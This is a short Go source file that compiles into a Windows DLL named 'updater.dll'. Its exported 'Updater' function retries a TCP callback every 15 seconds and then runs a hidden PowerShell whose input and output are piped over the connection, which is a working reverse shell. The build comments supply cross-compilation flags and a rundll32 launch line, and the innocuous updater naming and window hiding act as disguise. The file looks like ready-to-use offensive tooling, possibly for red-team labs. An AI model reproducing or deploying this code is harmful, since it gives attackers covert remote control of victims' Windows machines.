package main

// GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o updater.dll
// Windows: go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o updater.dll
// Run: rundll32.exe ./updater.dll,Updater

import (
        "net"
        "os/exec"
        "syscall"
        "time"
)

import "C"

// Updater sleeps for 15s and then attempts a callback
// to the specified IP address and Port. Upon connection,
// PowerShell is executed and forwarded over the established
// connection
//export Updater
func Updater() {
        for {
                time.Sleep(15 * time.Second)

                dialer := net.Dialer{
                        Timeout: 5 * time.Second,
                }

                conn, err := dialer.Dial("tcp", "127.1:7331")

                if err != nil {
                        continue
                }

                cmd := exec.Command("powershell.exe")

                // hides PowerShell window after command execution
                cmd.SysProcAttr = &syscall.SysProcAttr{
                        HideWindow: true,
                }

                cmd.Stdin = conn
                cmd.Stdout = conn
                cmd.Stderr = conn
                cmd.Run()
        }
}

// main is required in order for compilation
func main() {
}
